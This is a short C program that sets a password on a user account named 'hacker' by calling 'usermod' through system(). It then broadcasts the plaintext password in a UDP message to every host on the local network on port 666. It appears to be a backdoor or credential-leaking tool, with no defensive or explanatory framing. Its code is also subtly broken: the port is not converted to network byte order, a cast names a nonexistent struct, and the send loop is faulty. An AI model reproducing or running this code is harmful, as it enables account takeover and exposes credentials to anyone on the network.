#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>

#define SALT "$1$mushroom$"
#define USER "hacker"
#define PORT 666
#define DEST_ADDR "255.255.255.255"

int main(int argc, char *argv[])
{
  char *password, cmd[180], msg[200];
  int sockfd, broadcast = 1, len = 0, sent = 0, i = 0;
  struct sockaddr_in send_addr;

  password = crypt(argv[1], SALT);
  snprintf(cmd, sizeof(cmd), "usermod -p '%s' %s", password, USER);
  system(cmd);

  if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
  {
    perror("socket");
    exit(1);
  }

  if (setsockopt(sockfd, SOL_SOCKET, SO_BROADCAST, &broadcast, sizeof(broadcast)) == -1)
  {
    perror("setsockopt");
    exit(1);
  }

  memset(&send_addr, 0, sizeof(struct sockaddr_in));
  send_addr.sin_family = AF_INET;
  send_addr.sin_port = PORT;
  inet_pton(AF_INET, DEST_ADDR, (struct sock_addr *) &send_addr.sin_addr.s_addr);

  snprintf(msg, sizeof(msg), "The password is now: %s", argv[1]);
  len = strlen(msg);

  while ((sent = sendto(sockfd, &msg[i], len,  0, (struct sockaddr *) &send_addr, sizeof(send_addr))) < len)
  {
    i = sent;
    len -= sent;
  }

  close(sockfd);
  return 0;
}